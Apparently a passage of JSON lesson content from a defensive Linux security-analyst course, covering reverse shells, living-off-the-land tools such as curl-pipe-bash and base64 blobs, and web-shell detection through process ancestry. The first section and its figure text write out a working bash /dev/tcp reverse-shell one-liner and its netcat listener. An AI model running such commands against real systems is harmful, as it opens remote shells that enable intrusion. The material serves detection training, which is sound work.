      {
        "heading": "Reverse Shells and Reading Outbound Connections",
        "content": "When a Linux server is compromised, the single most common thing the attacker wants is an interactive shell they can type into from across the internet. But there is a problem for them: almost every server sits behind a firewall that **blocks inbound** connections. The elegant, ubiquitous solution — and the one you will investigate again and again — is the **reverse shell**: instead of the attacker connecting *in*, the victim connects *out* to the attacker.\n\nThe mechanics are worth seeing once, because the artifact is unmistakable. A classic Linux reverse shell is a single line:\n\n```\nbash -i >& /dev/tcp/185.4.2.9/4444 0>&1\n```\n\n`/dev/tcp/HOST/PORT` is a built-in bash feature — **nothing is installed** — that opens a network connection; the redirections wire an interactive bash session over it. On the other end the attacker simply waits with a listener (`nc -lvnp 4444`). The crucial point for defence: because the connection is **outbound**, the inbound firewall never applies. This is exactly why **egress (outbound) filtering** matters so much on servers — a web server has almost no legitimate reason to open a connection *out* to a random internet address on a high port.\n\nSo detection is about reading outbound connections and the processes behind them. Three commands are your bread and butter on a live host:\n\n- **`ss -tnp`** (or the older `netstat -tnp`) — lists TCP connections with the owning process. You are hunting an **ESTABLISHED** session going *out* to an unfamiliar IP on an odd port, owned by a shell or `nc`.\n- **`lsof -i :4444`** — ties a specific port to a **PID**, and from the PID you get the parent process.\n- **`ps -ef` / the process tree** — the parent is the tell. A `bash` whose parent is a **web server or a cron job** is not someone working — it is a shell that was spawned by something that should never spawn shells.\n\nThe mindset to carry from here: on a server, **outbound is the interesting direction.** Inbound noise is constant and mostly blocked; a server reaching *out* to a strange host — especially a shell process doing it — is the shape of a live compromise, and `/dev/tcp`, `nc`, `socat`, or a `python -c` one-liner in the command history is the confirmation.",
        "image": {"src":"/lesson-images/linux/reverse-shell-and-triage.svg","alt":"A diagram of a Linux reverse shell. On the left, a compromised host runs 'bash -i >& /dev/tcp/185.4.2.9/4444 0>&1', a built-in bash feature that opens an outbound connection and hands an interactive shell over it. In the middle, a firewall that blocks inbound but allows outbound lets the connection pass. On the right, the attacker's listener 'nc -lvnp 4444' receives the shell — inbound rules never applied. An arrow shows the shell travelling outbound from victim to attacker. Below, three detection panels show what an analyst runs on the host: 'ss -tnp' or 'netstat -tnp' to see the established outbound session to a strange IP on port 4444, 'lsof -i :4444' and 'ps -ef' to tie the socket to a process and its parent (a shell parented by a web server or cron is the tell), and auditd EXECVE plus bash_history to find the /dev/tcp, nc, socat, or python one-liner that ran.","caption":"A reverse shell has the victim dial OUT, so the inbound firewall never sees it — which is why outbound is the interesting direction on a server, and ss/lsof/ps are how you catch it.","credit":"Figure authored for this course."}
      },
      {
        "heading": "Living Off the Linux Land: curl | bash, base64, and /tmp",
        "content": "Just as Windows attackers abuse PowerShell and signed binaries, Linux attackers lean on the trusted, pre-installed tools every server already has. There is nothing to install, nothing obviously malicious to flag, and the commands blend into an admin's normal work. Recognising the patterns is what separates a real lead from background noise.\n\nThe recurring shapes to know on sight:\n\n- **`curl … | bash` (or `wget -qO- … | sh`)** — download a script straight from the internet and pipe it directly into a shell, so it **runs without ever being saved to disk**. Legitimate installers do this too, which is exactly why attackers hide in it — but a server fetching and executing a script from an unfamiliar host is worth a hard look.\n- **`base64 -d` / encoded blobs** — the Linux equivalent of PowerShell's `-enc`: the real command is Base64-encoded to slip past keyword matching, then decoded and piped to a shell. Seeing `echo <blob> | base64 -d | bash` is a strong signal.\n- **Interpreter one-liners** — `python3 -c '...'`, `perl -e '...'`, `php -r '...'`. These spawn a shell or a reverse shell entirely from a language runtime, no separate binary needed. A web/interpreter process launching one is a classic tell.\n- **Execution from `/tmp` and `/dev/shm`** — world-writable directories where any user can drop and run a file. `/dev/shm` lives in memory, which attackers like because it leaves less on disk. A binary executing out of either location deserves suspicion by default.\n\nThere is a companion idea worth naming: **GTFOBins.** Many perfectly ordinary Linux binaries — `find`, `vim`, `awk`, `tar`, even `less` — have documented tricks to spawn a shell or read protected files. When such a binary is misconfigured with elevated rights (for example, a SUID root `find`), an attacker uses the *legitimate program's own features* to become root. You do not memorise the list; you internalise the pattern: **a boring utility behaving like a shell — spawning `sh`, opening a socket, reading `/etc/shadow` — is the anomaly.**\n\nThe unifying rule mirrors the Windows LOLBins lesson: you cannot blocklist `curl`, `python`, or `find` — the system needs them. Detection is about **context and behaviour**: *who* ran the tool (a web-server user? a service account?), *what* it did that is out of character (fetched a remote script, decoded a blob, spawned a shell), and *where from* (`/tmp`, `/dev/shm`). The tool is innocent; the use is what you judge."
      },
      {
        "heading": "Web Shells and the www-data Tell",
        "content": "A huge share of Linux server compromises begin not with a stolen password but with a **web shell** — a small malicious script an attacker plants on a web server (by exploiting a vulnerable upload, an unpatched app, or an injection flaw) that lets them run operating-system commands by simply visiting a URL. The web-application lesson covers how the attacker gets the shell onto the server; here is the other half you own as a host analyst: **how the resulting activity betrays itself in the process tree.**\n\nThe key insight is about *identity*. A web server runs its worker processes under a dedicated, deliberately low-privilege service account — commonly **`www-data`** (Debian/Ubuntu/Nginx/Apache), `apache` or `nginx` on other distributions. That account exists to serve pages. It has **no legitimate reason to launch a shell, run `whoami`, spawn `bash`, use `curl`, or read `/etc/passwd`.** So the signature of a web shell in action is stark: a normal system process ancestry becomes `nginx → sh → whoami` or `apache2 → bash → curl`. When the web-server user starts *executing commands*, the server has almost certainly been compromised.\n\nWhat that means at the console:\n\n- **Watch process ancestry, not just process names.** `bash` is normal; `bash` **whose parent is `nginx`/`apache2`/`php-fpm`** is not. The parent-child relationship is the alarm, exactly as with the Windows parent-child tree.\n- **The commands come in a recognisable order.** Fresh web-shell operators almost always run reconnaissance first — `whoami`, `id`, `uname -a`, `ls` — before moving to download tools or escalate. A burst of those under `www-data` is a live intrusion in its early minutes.\n- **From there it chains to everything else in this lesson.** The web shell is the foothold; the reverse shell is often the next step (a more comfortable, interactive session), followed by living-off-the-land tooling and a privilege-escalation attempt from `www-data` toward root.\n\nThe takeaway ties the Linux material together: identity plus ancestry is your lens. A command is not suspicious because of *what* it is — `whoami` is harmless — but because of **who ran it and what spawned them.** A service account that only ever served web pages suddenly asking \"who am I?\" is one of the clearest compromise signals a Linux SOC analyst will ever read."
      }
